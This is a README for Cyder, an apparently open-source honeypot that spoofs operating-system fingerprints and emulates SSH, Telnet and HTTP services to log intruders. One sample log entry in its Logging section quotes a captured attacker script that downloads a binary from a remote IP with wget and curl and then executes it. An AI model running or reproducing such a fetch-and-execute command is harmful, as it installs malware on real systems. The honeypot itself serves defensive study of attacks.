# Cyder
Cyder is a Honeypot that can imitate any machines Operating System (OS) that is available in the NMAP database. It can detect probes by NMAP and reply with the OS fingerprint provided to it.

Other than being able to spoof the operating system, it is also able to run an interactive SSH service. Other services that are partially interactive includes: Telnet and HTTP. A basic echo reply for banner detection is included as well.


## Features

- Operating System Spoofing

    - The main function of Cyder is that it is able to spoof any operating system as well as services that exists in the NMAP database.

- SSH Emulation

    - Allow attackers to enter an emulated SSH environment and see what commands are being inputted
    - Virtual File System, with the ability to choose what kind of files and content
    - Allows attacker to pivot their attack through SSH to another private network. These networks can choose to have a different virtual file system.

- Telnet Emulation

    - A simple Telnet emulation that prompts the attacker for credentials, then logs the attempt

- HTTP Emulation

    - A simple Flask website, running behind Waitress that prompts a simple basic authorization, when visited.

- Service Echo
    - Echo backs a specified banner or version number to the attacker that prompt the service port number

- Logging
    - Cyder can log all TCP/UDP packets that were sent to it, as well as the login attempts on interactive services. Packets and credentials are stored in a different file, in JSON format.


## Prerequisites

Cyder is created and tested on Ubuntu 18.04 LTS.

However, any other Operating System **MIGHT** work if it have the following libraries:

- iptables
- libnetfilter_queue
- Python 3.6+

**For Ubuntu 16, users have to upgrade the python to a newer version.**

## Setting Up

**Ubuntu 18.04 LTS**

- A script is provided at `./run.sh` to install all the required libraries and python modules.

    - `sudo ./run.sh`
    
**Ubuntu 16.04 LTS**

- By default, Ubuntu 16.04 does not have Python 3.6 and above. Users will have to install a newer version of Python and run the commands base on the script. (Some modifications are required)

**Other Linux**

- Do ensure that `iptables` and `libnetfilter_queue` is available. As well as the Linux is able to install the `libnetfilter-queue-dev`. 
    - `libnetfilter-queue-dev` is required for Python 3 NetfilterQueue
- Python 3.6 and above is required for Asyncio work.
- Highly unrecommended to run it on other Linux.

## Guide
**DO REMEMBER TO CHANGE THE DEFAULT SSH SERVICE PORT 22 TO OTHER PORT NUMBER**

After installing, do configure Cyder configurations before running the Honeypot. 

- The configuration file can be found at:
    - `./configuration/host_config.ini`

Default Configuration:

```
[CONFIGURATION]
logging = localhost
interface = ens33 ; Change here to your adaptor interface
log_path = /var/log/cyder
debug = true

[HOST]
ip = 192.168.1.154 ; Change this to your device ip
mac_address = E2:FA:A8:BD:E6:04 ; Can be set to false to disable change of mac address
http = false
ssh = true
telnet = true
file_system = ./configuration/fs/default_fs.json

fingerprint = SEQ(SP=D-17%GCD=6400|FA00%ISR=97-A1%TI=I%II=I%SS=S%TS=U)
  OPS(O1=M5B4%O2=M5B4%O3=M5B4%O4=M5B4%O5=M5B4%O6=M5B4)
  WIN(W1=2238%W2=2238%W3=2238%W4=2238%W5=2238%W6=2238)
  ECN(R=Y%DF=N%T=19-23%TG=20%W=2238%O=M5B4%CC=N%Q=)
  T1(R=Y%DF=N%T=19-23%TG=20%S=O%A=S+%F=AS%RD=0%Q=)
  T2(R=N)
  T3(R=Y%DF=N%T=19-23%TG=20%W=2238%S=O%A=O%F=A%O=%RD=0%Q=)
  T4(R=Y%DF=N%T=19-23%TG=20%W=2238%S=A%A=Z%F=R%O=%RD=0%Q=)
  T5(R=Y%DF=N%T=19-23%TG=20%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
  T6(R=Y%DF=N%T=19-23%TG=20%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
  T7(R=Y%DF=N%T=19-23%TG=20%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
  U1(DF=N%T=FA-104%TG=FF%IPL=38%UN=0%RIPL=G%RID=4210%RIPCK=Z%RUCK=0%RUD=G)
  IE(DFI=S%T=FA-104%TG=FF%CD=S)
  
22 = Cisco-1\.25\.0\r?\n

23 = \xff\xfb\x01\xff\xfb\x03\xff\xfb\0\xff\xfd\0\xff\xfd\x1f\r\nUser Access Verification\r\n\r\nUsername:[ ]

80 = HTTP/1\.0 200 OK\r\nDate: .*\r\nServer: cisco-IOS/15\.0 HTTP-server/7\.0\r\n

3389 = \x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x1f\x08\0\x02\0\0\0

139 = smbd: error while loading shared libraries: libattr\.so\.1: cannot open shared object file: No such file or directory\n

```

Do remember to change the interface and IP address to your device settings.

##### Local Machine
To run the Honeypot on a **local machine**, simply just do:

- `python3 app.py`

##### Cloud Machine
To run the Honeypot on a **Cloud Machine**, simply just do:

- `tmux`

- `python3 app.py`

- `CTRL + B`, `D` (to exit tmux session, but keep session alive)

#### Fingerprints & Services

- Operating System Fingerprints can be found at:
    - https://svn.nmap.org/nmap/nmap-os-db
- Services Fingerprints can be found at:
    - https://svn.nmap.org/nmap/nmap-service-probes

A little manual work have to be done for the Service Fingerprint, instead of copy and pasting. Users need to remove a few text at the front if SSH is set to true (to emulate SSH). Simply remove the `SSH-2.0-` from the front of the fingerprint. All the configuration have to be in **REGEX** format. 

Do run a NMAP test to ensure that everything is working fine.

- `nmap -sS -sV -O <ip address>`



#### Add Service Emulation on Another Port

This feature is not yet added to the configuration file. Therefore, in order to run service emulation on another port number, edit the `app.py` file, at `./CYDER/product/app.py`

At around line 60, there's an example showing how another Telnet service is being ran for port 2323. 

- `start_service(services[2323], 2323, '0.0.0.0', start_telnet_server)`
- `del service[2323]`

This works for SSH and HTTP as well. Simple change `start_telnet_server` to either `start_ssh_server` or `start_http_server`.

** Note: Do remember to add the port number to the `host_config.ini` file

## Files of Interest

- `./run.sh`
    - Setup script for Ubuntu 18.04 LTS
- `./configuration/host_config.ini`
    - Configuration for Host running Cyder
- `./configuration/virtual_config.ini`
    - Configuration for SSH pivoting (Cyder will take up those IP address and act as a network)
- `./configuration/credentials.txt`
    - Credentials for SSH Emulation
- `./configuration/key/`
    - Contains the server keys used for SSH
- `./vfssh/vfs/command/`
    - Directory containing commands that are available for the emulated shell.
    - Users can create their own command and drop it there. 
    - Follow the `./vfssh/vfs/command/Template.py` format



## Logging

Logs are stored in `/var/log/cyder` by default, unless changed. All logs are in `json` format.

**cyder.json**

- Contains credentials and commands that are attempted through SSH/Telnet/HTTP
- Example of Logs:
    - `{"timestamp": 1577716279.8859844, "protocol": "SSH", "username": "root", "password": "admin", "dst_ip": "x.x.x.x", "dst_port": 22, "src_ip": "x.x.x.x", "src_port": 52772}`
    
    - `{"timestamp": 1577682398.527439, "protocol": "SSH", "command": "#!/bin/sh\nPATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nwget http://23.228.113.117/21\ncurl -O http://x.x.x.x/21\nchmod +x 21\n./21\n", "dst_ip": "x.x.x.x", "dst_port": 22, "src_ip": "x.x.x.x", "src_port": 50433}`
    
    - `{"timestamp": 1577682701.8840919, "protocol": "Telnet", "username": "admin", "password": "", "src_ip": "x.x.x.x", "dst_ip": "x.x.x.x", "src_port": 56380}`
    
    - Timestamp is in epoch time format.

**packet.json**

- Contains the packet bytes the host received. **NOTE:** it does not contain packets that are sent out.
- Example of Packet Log:
    - `{"timestamp": 1577678695.520519, "dst_ip": "x.x.x.x", "host_os": "HOST", "src_ip": "x.x.x.x", "services": 22, "packet": "d2h5IGRpZCB5b3UgZXZlbiB0cnkgdG8gZGVjb2RlIHRoaXM/IEkgd291bGRuJ3QgcHV0IGEgcmVhbCBwYWNrZXQgaGVyZQ==\n"}`
    
    - The packet is base64 encoded. To decode it, use:
    
        - `base64.decodebytes(packet.encode('ascii'))`
        - This will return you the actual bytes.
        
    - `services` is the port number.

**cyder.pcap**

- The pcap file that was obtained through tcpdump. This pcap contains incoming and outgoing packets.

**debug.json**

- Self-explanatory 

## Known Issues, Limitations and Fixes

1. Issue:

    - Nmap result is inaccurate for services and/or operating system

    Fix:

    - For services, if emulated SSH is set to true in the `host_config.ini`, the text `SSH-2.0` will be automatically appended. (Do manually remove it from 22=`SSH-2.0-` in the configuration file)
    - Services have to be in regex format.

    Limitations:

    - Operating System sometimes will yield inaccurate result. But it will always be in the aggressive scan result. Do not worry about it.
    - UDP Packets are dropped. Multiple tests are done and by enabling it, I am unable to spoof the operating system.

2. Issue:

    - `:0: UserWarning: You do not have a working installation of the service_identity module: 'cannot import name'...`

    Fix:

    - `pip3 install --upgrade service_identity`

3. Issue:

    - `Error while attempting to bind on address ('0.0.0.0', 22)`

    Fix:

    - Any services that you want to run on Cyder, do make sure the default device does not have running services on that port. (SSH notably)

    
#### TODO

* [x] Operating System Spoofing
* [x] Virtual Device (Not Used)
* [x] Telnet Service (Twisted)
* [x] SSH Service (AsyncSSH)
* [x] HTTP Service (Waitress & Flask)
* [x] Allow Multiple Service on Different Port
* [x] AWS EC2 Cloud Test
* [ ] SFTP Server (AsyncSSH)
* [ ] SCP Server (AsyncSSH)

#### Reference
* https://github.com/SecureAuthCorp/impacket
* https://github.com/mushorg/oschameleon
* https://github.com/cowrie/cowrie
* Stackoverflow

#### Credits
* [@hooami](https://github.com/hooami)
* [@WhIteLIght](https://github.com/ChoonSiang)
